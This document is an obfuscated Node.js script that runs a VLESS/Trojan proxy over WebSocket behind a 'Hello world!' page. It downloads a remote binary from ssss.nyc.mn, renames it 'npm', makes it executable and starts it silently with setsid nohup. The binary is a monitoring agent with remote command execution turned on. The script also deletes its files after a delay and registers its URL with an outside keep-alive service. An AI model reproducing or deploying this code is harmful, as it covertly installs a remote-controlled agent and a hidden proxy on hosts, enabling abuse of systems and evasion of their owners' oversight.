const _0x4008f3=_0x343e;(function(_0x48df71,_0x5284c9){const _0x2df75d={_0x1e1088:0x177,_0x3f0e61:0x136,_0x9980fa:0x151,_0x20360f:0x148},_0x3ac0b1=_0x343e,_0x5240f7=_0x48df71();while(!![]){try{const _0x38c5e6=parseInt(_0x3ac0b1(0x198))/0x1+parseInt(_0x3ac0b1(0x153))/0x2*(-parseInt(_0x3ac0b1(_0x2df75d._0x1e1088))/0x3)+-parseInt(_0x3ac0b1(_0x2df75d._0x3f0e61))/0x4*(-parseInt(_0x3ac0b1(0x189))/0x5)+-parseInt(_0x3ac0b1(0x17c))/0x6*(-parseInt(_0x3ac0b1(0x1a0))/0x7)+-parseInt(_0x3ac0b1(0x197))/0x8+parseInt(_0x3ac0b1(0x19e))/0x9*(parseInt(_0x3ac0b1(_0x2df75d._0x9980fa))/0xa)+-parseInt(_0x3ac0b1(0x12f))/0xb*(-parseInt(_0x3ac0b1(_0x2df75d._0x20360f))/0xc);if(_0x38c5e6===_0x5284c9)break;else _0x5240f7['push'](_0x5240f7['shift']());}catch(_0x373b2d){_0x5240f7['push'](_0x5240f7['shift']());}}}(_0x1259,0x21bfa));const os=require('os'),http=require(_0x4008f3(0x1a2)),fs=require('fs'),axios=require('axios'),net=require('net'),path=require(_0x4008f3(0x188)),crypto=require(_0x4008f3(0x19a)),{Buffer}=require(_0x4008f3(0x1a7)),{exec,execSync}=require(_0x4008f3(0x18f)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env']['UUID']||_0x4008f3(0x141),NEZHA_SERVER=process[_0x4008f3(0x180)][_0x4008f3(0x16c)]||'',NEZHA_PORT=process[_0x4008f3(0x180)][_0x4008f3(0x150)]||'',NEZHA_KEY=process[_0x4008f3(0x180)]['NEZHA_KEY']||'',DOMAIN=process[_0x4008f3(0x180)]['DOMAIN']||'1234.abc.com',AUTO_ACCESS=process[_0x4008f3(0x180)][_0x4008f3(0x12d)]||![],WSPATH=process[_0x4008f3(0x180)]['WSPATH']||UUID[_0x4008f3(0x15f)](0x0,0x8),SUB_PATH=process[_0x4008f3(0x180)][_0x4008f3(0x1a1)]||_0x4008f3(0x157),NAME=process[_0x4008f3(0x180)][_0x4008f3(0x17f)]||'',PORT=process[_0x4008f3(0x180)][_0x4008f3(0x19f)]||0xbb8;let ISP='';const GetISP=async()=>{const _0x2e39f6={_0x5086a2:0x164,_0x2e4e9b:0x1a8,_0x750ab9:0x165,_0x117c28:0x182,_0xfd412b:0x12e},_0x489663=_0x4008f3;try{const _0x5d3c15=await axios[_0x489663(_0x2e39f6._0x5086a2)](_0x489663(_0x2e39f6._0x2e4e9b)),_0x1399e8=_0x5d3c15[_0x489663(_0x2e39f6._0x750ab9)];ISP=(_0x1399e8[_0x489663(0x137)]+'-'+_0x1399e8[_0x489663(_0x2e39f6._0x117c28)])[_0x489663(_0x2e39f6._0xfd412b)](/ /g,'_');}catch(_0x17a4ba){ISP=_0x489663(0x167);}};GetISP();const httpServer=http[_0x4008f3(0x13e)]((_0x3b3729,_0x34faf3)=>{const _0x4b4f8e={_0x19dd7f:0x163,_0x3db481:0x1a3,_0x265358:0x155,_0x5e5def:0x135,_0x4d3e01:0x154,_0x49bc0d:0x13f,_0x545e36:0x192,_0x3732a8:0x194,_0x47bbc6:0x192,_0x2a6be9:0x16e,_0x2b029c:0x179,_0x50544e:0x14e,_0x1f0134:0x14e,_0x2a653:0x170},_0xd71384={_0x510c6e:0x183,_0x4fe547:0x14e},_0x43a4d1=_0x4008f3;if(_0x3b3729[_0x43a4d1(_0x4b4f8e._0x19dd7f)]==='/'){const _0x45f7b1=path[_0x43a4d1(_0x4b4f8e._0x3db481)](__dirname,_0x43a4d1(_0x4b4f8e._0x265358));fs['readFile'](_0x45f7b1,_0x43a4d1(_0x4b4f8e._0x5e5def),(_0xea7bef,_0x2bdf6)=>{const _0xfc1537=_0x43a4d1;if(_0xea7bef){_0x34faf3['writeHead'](0xc8,{'Content-Type':_0xfc1537(_0xd71384._0x510c6e)}),_0x34faf3[_0xfc1537(_0xd71384._0x4fe547)](_0xfc1537(0x19c));return;}_0x34faf3['writeHead'](0xc8,{'Content-Type':'text/html'}),_0x34faf3['end'](_0x2bdf6);});return;}else{if(_0x3b3729[_0x43a4d1(_0x4b4f8e._0x19dd7f)]==='/'+SUB_PATH){const _0x24179b=NAME?NAME+'-'+ISP:ISP,_0x4db804=_0x43a4d1(_0x4b4f8e._0x4d3e01)+UUID+_0x43a4d1(_0x4b4f8e._0x49bc0d)+DOMAIN+_0x43a4d1(_0x4b4f8e._0x545e36)+DOMAIN+_0x43a4d1(0x16e)+WSPATH+'#'+_0x24179b,_0x29cbea=_0x43a4d1(0x16f)+UUID+_0x43a4d1(_0x4b4f8e._0x3732a8)+DOMAIN+_0x43a4d1(_0x4b4f8e._0x47bbc6)+DOMAIN+_0x43a4d1(_0x4b4f8e._0x2a6be9)+WSPATH+'#'+_0x24179b,_0x128e3f=_0x4db804+'\x0a'+_0x29cbea,_0x341be2=Buffer[_0x43a4d1(0x149)](_0x128e3f)['toString'](_0x43a4d1(_0x4b4f8e._0x2b029c));_0x34faf3[_0x43a4d1(0x1a5)](0xc8,{'Content-Type':'text/plain'}),_0x34faf3[_0x43a4d1(_0x4b4f8e._0x50544e)](_0x341be2+'\x0a');}else _0x34faf3['writeHead'](0x194,{'Content-Type':'text/plain'}),_0x34faf3[_0x43a4d1(_0x4b4f8e._0x1f0134)](_0x43a4d1(_0x4b4f8e._0x2a653));}}),wss=new WebSocket[(_0x4008f3(0x174))]({'server':httpServer}),uuid=UUID['replace'](/-/g,''),DNS_SERVERS=[_0x4008f3(0x18a),_0x4008f3(0x18c)];function resolveHost(_0x1cbe06){const _0x42f222={_0x1044ea:0x1a4},_0x290113={_0x361bb5:0x187,_0x123837:0x178,_0x329b02:0x18e,_0x5ada52:0x186,_0x2eda88:0x190};return new Promise((_0x5897d2,_0x4d2f71)=>{const _0x1fd82f=_0x343e;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x1fd82f(_0x42f222._0x1044ea)](_0x1cbe06)){_0x5897d2(_0x1cbe06);return;}let _0xbead0d=0x0;function _0x5d6a7b(){const _0x150cf0={_0x13f2ef:0x15b,_0x302af6:0x17a,_0x46a700:0x165},_0x21ed08=_0x1fd82f;if(_0xbead0d>=DNS_SERVERS[_0x21ed08(_0x290113._0x361bb5)]){_0x4d2f71(new Error('Failed\x20to\x20resolve\x20'+_0x1cbe06+_0x21ed08(_0x290113._0x123837)));return;}const _0x3946a1=DNS_SERVERS[_0xbead0d];_0xbead0d++;const _0x51c269=_0x21ed08(0x131)+encodeURIComponent(_0x1cbe06)+_0x21ed08(_0x290113._0x329b02);axios[_0x21ed08(0x164)](_0x51c269,{'timeout':0x1388,'headers':{'Accept':_0x21ed08(_0x290113._0x5ada52)}})[_0x21ed08(0x175)](_0x5834e8=>{const _0x1ee671=_0x21ed08,_0x540b41=_0x5834e8[_0x1ee671(0x165)];if(_0x540b41[_0x1ee671(_0x150cf0._0x13f2ef)]===0x0&&_0x540b41['Answer']&&_0x540b41['Answer'][_0x1ee671(0x187)]>0x0){const _0x4755b9=_0x540b41[_0x1ee671(0x166)][_0x1ee671(_0x150cf0._0x302af6)](_0x48d750=>_0x48d750[_0x1ee671(0x185)]===0x1);if(_0x4755b9){_0x5897d2(_0x4755b9[_0x1ee671(_0x150cf0._0x46a700)]);return;}}_0x5d6a7b();})[_0x21ed08(_0x290113._0x2eda88)](_0x142562=>{_0x5d6a7b();});}_0x5d6a7b();});}function handleVlessConnection(_0x187cd7,_0x2f4d9e){const _0x61608={_0x48ed06:0x15f,_0x54187b:0x15f,_0x414a4a:0x13d,_0xbe7385:0x17d,_0x1ce1d1:0x15f,_0x3e098a:0x15f,_0x792b2f:0x15f,_0x18090a:0x13d},_0x5ec86b={_0x580a9e:0x171},_0x3f38b5={_0xf8ed2c:0x15f,_0x474298:0x15a,_0x5eda4d:0x139},_0x330551=_0x4008f3,[_0x25ec18]=_0x2f4d9e,_0x57445d=_0x2f4d9e[_0x330551(_0x61608._0x48ed06)](0x1,0x11);if(!_0x57445d[_0x330551(0x195)]((_0x59df0a,_0x98e136)=>_0x59df0a==parseInt(uuid[_0x330551(0x142)](_0x98e136*0x2,0x2),0x10)))return![];let _0x99c5fe=_0x2f4d9e[_0x330551(_0x61608._0x54187b)](0x11,0x12)[_0x330551(_0x61608._0x414a4a)]()+0x13;const _0x3d892f=_0x2f4d9e[_0x330551(_0x61608._0x54187b)](_0x99c5fe,_0x99c5fe+=0x2)[_0x330551(_0x61608._0xbe7385)](0x0),_0x8b5d13=_0x2f4d9e[_0x330551(_0x61608._0x1ce1d1)](_0x99c5fe,_0x99c5fe+=0x1)[_0x330551(0x13d)](),_0x5f3567=_0x8b5d13==0x1?_0x2f4d9e[_0x330551(_0x61608._0x3e098a)](_0x99c5fe,_0x99c5fe+=0x4)[_0x330551(0x1a3)]('.'):_0x8b5d13==0x2?new TextDecoder()[_0x330551(0x159)](_0x2f4d9e[_0x330551(_0x61608._0x792b2f)](_0x99c5fe+0x1,_0x99c5fe+=0x1+_0x2f4d9e['slice'](_0x99c5fe,_0x99c5fe+0x1)[_0x330551(_0x61608._0x18090a)]())):_0x8b5d13==0x3?_0x2f4d9e[_0x330551(0x15f)](_0x99c5fe,_0x99c5fe+=0x10)[_0x330551(0x1a9)]((_0x5157ba,_0xf1b15e,_0x19fb9c,_0xdf49dd)=>_0x19fb9c%0x2?_0x5157ba['concat'](_0xdf49dd['slice'](_0x19fb9c-0x1,_0x19fb9c+0x1)):_0x5157ba,[])['map'](_0x10b6d4=>_0x10b6d4[_0x330551(0x17d)](0x0)['toString'](0x10))[_0x330551(0x1a3)](':'):'';_0x187cd7[_0x330551(0x16a)](new Uint8Array([_0x25ec18,0x0]));const _0x2189bd=createWebSocketStream(_0x187cd7);return resolveHost(_0x5f3567)['then'](_0x281e69=>{const _0x10d337=_0x330551;net[_0x10d337(0x171)]({'host':_0x281e69,'port':_0x3d892f},function(){const _0x595944=_0x10d337;this['write'](_0x2f4d9e[_0x595944(_0x3f38b5._0xf8ed2c)](_0x99c5fe)),_0x2189bd['on'](_0x595944(_0x3f38b5._0x474298),()=>{})[_0x595944(0x139)](this)['on']('error',()=>{})[_0x595944(_0x3f38b5._0x5eda4d)](_0x2189bd);})['on'](_0x10d337(0x15a),()=>{});})[_0x330551(0x190)](_0x5367f4=>{const _0x2e5739={_0x37ffbe:0x13b,_0x138481:0x15f,_0x194ae5:0x139,_0xc53267:0x15a},_0x1f588c=_0x330551;net[_0x1f588c(_0x5ec86b._0x580a9e)]({'host':_0x5f3567,'port':_0x3d892f},function(){const _0x459802=_0x1f588c;this[_0x459802(_0x2e5739._0x37ffbe)](_0x2f4d9e[_0x459802(_0x2e5739._0x138481)](_0x99c5fe)),_0x2189bd['on'](_0x459802(0x15a),()=>{})[_0x459802(_0x2e5739._0x194ae5)](this)['on'](_0x459802(_0x2e5739._0xc53267),()=>{})['pipe'](_0x2189bd);})['on']('error',()=>{});}),!![];}function _0x1259(){const _0x171fd6=['https://arm64.ssss.nyc.mn/agent','&path=%2F','trojan://','Not\x20Found\x0a','connect','map','connection','Server','then','https://','52527NqwqXh','\x20with\x20all\x20DNS\x20servers','base64','find','config.yaml','132vqsvVc','readUInt16BE','2087','NAME','env','once','isp','text/html','2096','type','application/dns-json','length','path','25NlOxCy','8.8.4.4','Automatic\x20Access\x20Task\x20added\x20successfully','1.1.1.1','post','&type=A','child_process','catch','2053','&fp=chrome&type=ws&host=','error:\x20','@cdns.doon.eu.org:443?security=tls&sni=','every','sha224','2194976dwahPs','124849hgOBWI','digest','crypto','npm\x20download\x20successfully','Hello\x20world!','close','351HknfEV','PORT','27496mvfLEW','SUB_PATH','http','join','test','writeHead','chmod\x20+x\x20npm','buffer','https://api.ip.sb/geoip','reduce','createHash','update','/bin/bash','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','createWriteStream','arm64','AUTO_ACCESS','replace','11aZWcFF','8443','https://dns.google/resolve?name=','npm\x20is\x20running','https://oooo.serv00.net/add-url','2083','utf8','140968iTYVIg','country_code','arm','pipe','aarch64','write','message','readUInt8','createServer','@cdns.doon.eu.org:443?encryption=none&security=tls&sni=','npm\x20is\x20already\x20running,\x20skip\x20running...','90b7274c-903f-4f34-b59a-62a6b2105e12','substr','setsid\x20nohup\x20./npm\x20-s\x20','npm','client_secret:\x20','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','https://arm64.ssss.nyc.mn/v1','290316OFuGwv','from','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','hex','application/json','split','end','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','NEZHA_PORT','4730OOfAKR','443','2eJgkPq','vless://','index.html','\x20-p\x20','xanavirn','log','decode','error','Status','npm\x20running\x20error:','writeFileSync','stream','slice','unlink','concat','trim','url','get','data','Answer','Unknown','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','Server\x20is\x20running\x20on\x20port\x20','send','toString','NEZHA_SERVER'];_0x1259=function(){return _0x171fd6;};return _0x1259();}function handleTrojanConnection(_0x216f14,_0x3d5741){const _0xd0f51e={_0x568792:0x15f,_0x5070df:0x1aa,_0xd4471a:0x196,_0x1625c3:0x15f,_0x316b31:0x1a3,_0x3ba50f:0x16b,_0x3fb4ce:0x15f,_0x484863:0x1a9,_0x27b7b3:0x17d,_0x31c72e:0x175,_0xf0f671:0x190},_0x2a1a7d={_0x193137:0x15a},_0x2da362={_0xcc31e1:0x139},_0x341530={_0x32665c:0x171},_0x2ae4fd=_0x4008f3;try{if(_0x3d5741[_0x2ae4fd(0x187)]<0x3a)return![];const _0x45334f=_0x3d5741[_0x2ae4fd(_0xd0f51e._0x568792)](0x0,0x38)[_0x2ae4fd(0x16b)](),_0x53ca1e=[UUID];let _0x154cd5=null;for(const _0x2ffeb4 of _0x53ca1e){const _0x528da4=crypto[_0x2ae4fd(_0xd0f51e._0x5070df)](_0x2ae4fd(_0xd0f51e._0xd4471a))[_0x2ae4fd(0x128)](_0x2ffeb4)[_0x2ae4fd(0x199)](_0x2ae4fd(0x14b));if(_0x528da4===_0x45334f){_0x154cd5=_0x2ffeb4;break;}}if(!_0x154cd5)return![];let _0x254575=0x38;_0x3d5741[_0x254575]===0xd&&_0x3d5741[_0x254575+0x1]===0xa&&(_0x254575+=0x2);const _0x18e7a2=_0x3d5741[_0x254575];if(_0x18e7a2!==0x1)return![];_0x254575+=0x1;const _0x5b3577=_0x3d5741[_0x254575];_0x254575+=0x1;let _0x2c8872,_0x11c0c7;if(_0x5b3577===0x1)_0x2c8872=_0x3d5741[_0x2ae4fd(_0xd0f51e._0x1625c3)](_0x254575,_0x254575+0x4)[_0x2ae4fd(_0xd0f51e._0x316b31)]('.'),_0x254575+=0x4;else{if(_0x5b3577===0x3){const _0x5ec4ed=_0x3d5741[_0x254575];_0x254575+=0x1,_0x2c8872=_0x3d5741[_0x2ae4fd(0x15f)](_0x254575,_0x254575+_0x5ec4ed)[_0x2ae4fd(_0xd0f51e._0x3ba50f)](),_0x254575+=_0x5ec4ed;}else{if(_0x5b3577===0x4)_0x2c8872=_0x3d5741[_0x2ae4fd(_0xd0f51e._0x3fb4ce)](_0x254575,_0x254575+0x10)[_0x2ae4fd(_0xd0f51e._0x484863)]((_0x495c7d,_0x40c080,_0x2157ec,_0x264bae)=>_0x2157ec%0x2?_0x495c7d[_0x2ae4fd(0x161)](_0x264bae[_0x2ae4fd(0x15f)](_0x2157ec-0x1,_0x2157ec+0x1)):_0x495c7d,[])[_0x2ae4fd(0x172)](_0x36237b=>_0x36237b[_0x2ae4fd(0x17d)](0x0)[_0x2ae4fd(0x16b)](0x10))['join'](':'),_0x254575+=0x10;else return![];}}_0x11c0c7=_0x3d5741[_0x2ae4fd(_0xd0f51e._0x27b7b3)](_0x254575),_0x254575+=0x2;_0x254575<_0x3d5741[_0x2ae4fd(0x187)]&&_0x3d5741[_0x254575]===0xd&&_0x3d5741[_0x254575+0x1]===0xa&&(_0x254575+=0x2);const _0x1489ae=createWebSocketStream(_0x216f14);return resolveHost(_0x2c8872)[_0x2ae4fd(_0xd0f51e._0x31c72e)](_0x49b614=>{const _0x1d7758={_0x597bf7:0x187,_0xf187cc:0x15f,_0x1aecd0:0x15a},_0x15c668=_0x2ae4fd;net[_0x15c668(_0x341530._0x32665c)]({'host':_0x49b614,'port':_0x11c0c7},function(){const _0x4d9529=_0x15c668;_0x254575<_0x3d5741[_0x4d9529(_0x1d7758._0x597bf7)]&&this[_0x4d9529(0x13b)](_0x3d5741[_0x4d9529(_0x1d7758._0xf187cc)](_0x254575)),_0x1489ae['on'](_0x4d9529(_0x1d7758._0x1aecd0),()=>{})[_0x4d9529(0x139)](this)['on'](_0x4d9529(0x15a),()=>{})['pipe'](_0x1489ae);})['on'](_0x15c668(0x15a),()=>{});})[_0x2ae4fd(_0xd0f51e._0xf0f671)](_0x2a01c9=>{const _0x147655=_0x2ae4fd;net[_0x147655(0x171)]({'host':_0x2c8872,'port':_0x11c0c7},function(){const _0x2b5e3d=_0x147655;_0x254575<_0x3d5741[_0x2b5e3d(0x187)]&&this[_0x2b5e3d(0x13b)](_0x3d5741['slice'](_0x254575)),_0x1489ae['on'](_0x2b5e3d(0x15a),()=>{})[_0x2b5e3d(_0x2da362._0xcc31e1)](this)['on'](_0x2b5e3d(0x15a),()=>{})[_0x2b5e3d(0x139)](_0x1489ae);})['on'](_0x147655(_0x2a1a7d._0x193137),()=>{});}),!![];}catch(_0x5c350d){return![];}}wss['on'](_0x4008f3(0x173),(_0x34468c,_0x2860dc)=>{const _0x16442c={_0x1467d3:0x187,_0x1af50d:0x15f,_0xfa7102:0x195,_0x2bfa1b:0x19d},_0x21d0fb=_0x4008f3,_0x702537=_0x2860dc[_0x21d0fb(0x163)]||'';_0x34468c[_0x21d0fb(0x181)](_0x21d0fb(0x13c),_0x70f4c7=>{const _0x2d9727=_0x21d0fb;if(_0x70f4c7[_0x2d9727(_0x16442c._0x1467d3)]>0x11&&_0x70f4c7[0x0]===0x0){const _0x2c7a22=_0x70f4c7[_0x2d9727(_0x16442c._0x1af50d)](0x1,0x11),_0x8f97ac=_0x2c7a22[_0x2d9727(_0x16442c._0xfa7102)]((_0x5bbe22,_0x25542d)=>_0x5bbe22==parseInt(uuid[_0x2d9727(0x142)](_0x25542d*0x2,0x2),0x10));if(_0x8f97ac){!handleVlessConnection(_0x34468c,_0x70f4c7)&&_0x34468c['close']();return;}}!handleTrojanConnection(_0x34468c,_0x70f4c7)&&_0x34468c[_0x2d9727(_0x16442c._0x2bfa1b)]();})['on']('error',()=>{});});function _0x343e(_0x5629a1,_0x15c07a){const _0x125996=_0x1259();return _0x343e=function(_0x343e96,_0x4de2fc){_0x343e96=_0x343e96-0x128;let _0x237af4=_0x125996[_0x343e96];return _0x237af4;},_0x343e(_0x5629a1,_0x15c07a);}const getDownloadUrl=()=>{const _0xec4274={_0x1eada9:0x138,_0x18637d:0x147,_0x176b47:0x16d},_0x54512c=_0x4008f3,_0x471f1d=os['arch']();return _0x471f1d===_0x54512c(_0xec4274._0x1eada9)||_0x471f1d===_0x54512c(0x12c)||_0x471f1d===_0x54512c(0x13a)?!NEZHA_PORT?_0x54512c(_0xec4274._0x18637d):_0x54512c(_0xec4274._0x176b47):!NEZHA_PORT?'https://amd64.ssss.nyc.mn/v1':'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{const _0x456cb9={_0x3d6202:0x15e,_0x17fe0a:0x165,_0x3ed421:0x139},_0x18e563={_0x4557c4:0x19b},_0x136acc=_0x4008f3;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x8b69c7=getDownloadUrl(),_0x2e4b5d=await axios({'method':_0x136acc(0x164),'url':_0x8b69c7,'responseType':_0x136acc(_0x456cb9._0x3d6202)}),_0x4bf7f7=fs[_0x136acc(0x12b)]('npm');return _0x2e4b5d[_0x136acc(_0x456cb9._0x17fe0a)][_0x136acc(_0x456cb9._0x3ed421)](_0x4bf7f7),new Promise((_0x3d3064,_0x526679)=>{_0x4bf7f7['on']('finish',()=>{const _0x308204=_0x343e;console[_0x308204(0x158)](_0x308204(_0x18e563._0x4557c4)),exec(_0x308204(0x1a6),_0x1cd542=>{if(_0x1cd542)_0x526679(_0x1cd542);_0x3d3064();});}),_0x4bf7f7['on']('error',_0x526679);});}catch(_0x10e178){throw _0x10e178;}},runnz=async()=>{const _0x4181f0={_0x344d94:0x162,_0x532798:0x158,_0x181460:0x152,_0xecb9d6:0x130,_0x26fa64:0x17e,_0x16176e:0x134,_0x407dad:0x191,_0xd6132b:0x14d,_0x37121b:0x14f,_0x3041b3:0x15d,_0x3aed01:0x129,_0x4c4916:0x15a,_0xe30b67:0x193},_0x36c534={_0x243b1f:0x15c,_0x12be02:0x132},_0x2cadbb=_0x4008f3;try{const _0x5690dc=execSync(_0x2cadbb(0x14a),{'encoding':'utf-8'});if(_0x5690dc[_0x2cadbb(_0x4181f0._0x344d94)]()!==''){console[_0x2cadbb(_0x4181f0._0x532798)](_0x2cadbb(0x140));return;}}catch(_0x2170be){}await downloadFile();let _0x5150a9='',_0x2602c9=[_0x2cadbb(_0x4181f0._0x181460),_0x2cadbb(_0x4181f0._0xecb9d6),_0x2cadbb(0x184),_0x2cadbb(_0x4181f0._0x26fa64),_0x2cadbb(_0x4181f0._0x16176e),_0x2cadbb(_0x4181f0._0x407dad)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x408269=_0x2602c9['includes'](NEZHA_PORT)?'--tls':'';_0x5150a9=_0x2cadbb(0x143)+NEZHA_SERVER+':'+NEZHA_PORT+_0x2cadbb(0x156)+NEZHA_KEY+'\x20'+_0x408269+_0x2cadbb(0x168);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x2a606f=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x2cadbb(_0x4181f0._0xd6132b)](':')['pop']():'',_0x2e0a8e=_0x2602c9['includes'](_0x2a606f)?'true':'false',_0x1c4aac=_0x2cadbb(0x145)+NEZHA_KEY+_0x2cadbb(_0x4181f0._0x37121b)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x2e0a8e+_0x2cadbb(0x12a)+UUID;fs[_0x2cadbb(_0x4181f0._0x3041b3)]('config.yaml',_0x1c4aac);}_0x5150a9=_0x2cadbb(0x146);}else{console[_0x2cadbb(0x158)]('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(_0x5150a9,{'shell':_0x2cadbb(_0x4181f0._0x3aed01)},_0x21f8a1=>{const _0x3b119e=_0x2cadbb;if(_0x21f8a1)console['error'](_0x3b119e(_0x36c534._0x243b1f),_0x21f8a1);else console[_0x3b119e(0x158)](_0x3b119e(_0x36c534._0x12be02));});}catch(_0x4e30be){console[_0x2cadbb(_0x4181f0._0x4c4916)](_0x2cadbb(_0x4181f0._0xe30b67)+_0x4e30be);}};async function addAccessTask(){const _0x3dd29b={_0x4020f9:0x133,_0x159671:0x14c},_0x4b79ae=_0x4008f3;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x259fe0=_0x4b79ae(0x176)+DOMAIN+'/'+SUB_PATH;try{const _0x1be747=await axios[_0x4b79ae(0x18d)](_0x4b79ae(_0x3dd29b._0x4020f9),{'url':_0x259fe0},{'headers':{'Content-Type':_0x4b79ae(_0x3dd29b._0x159671)}});console[_0x4b79ae(0x158)](_0x4b79ae(0x18b));}catch(_0x215b6b){}}const delFiles=()=>{const _0x1ef31d={_0x55f59e:0x160},_0xabdad1=_0x4008f3;fs['unlink'](_0xabdad1(0x144),()=>{}),fs[_0xabdad1(_0x1ef31d._0x55f59e)](_0xabdad1(0x17b),()=>{});};httpServer['listen'](PORT,()=>{const _0x23fab1={_0x5cafb2:0x169},_0x258eb1=_0x4008f3;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log'](_0x258eb1(_0x23fab1._0x5cafb2)+PORT);});
